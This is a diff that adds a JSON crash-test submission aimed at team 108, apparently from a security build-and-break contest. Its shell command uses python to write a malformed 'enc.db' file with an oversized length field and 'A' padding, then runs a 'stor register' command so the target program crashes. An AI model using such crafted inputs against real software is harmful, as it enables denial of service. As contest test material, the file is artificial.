@@ -1,0 +1,23 @@
+{
+  "target_team": 108,
+  "type": "crash",
+  "commands": [
+    {
+      "program": "sh",
+      "args": [
+        "-c",
+        "python3 -c 'open(\"enc.db\",\"wb\").write((0).to_bytes(4,\"little\")+(1073741824).to_bytes(4,\"little\")+b\"A\"*548)'"
+      ]
+    },
+    {
+      "program": "stor",
+      "args": [
+        "-u",
+        "crashuser",
+        "-k",
+        "crashkey",
+        "register"
+      ]
+    }
+  ]
+}
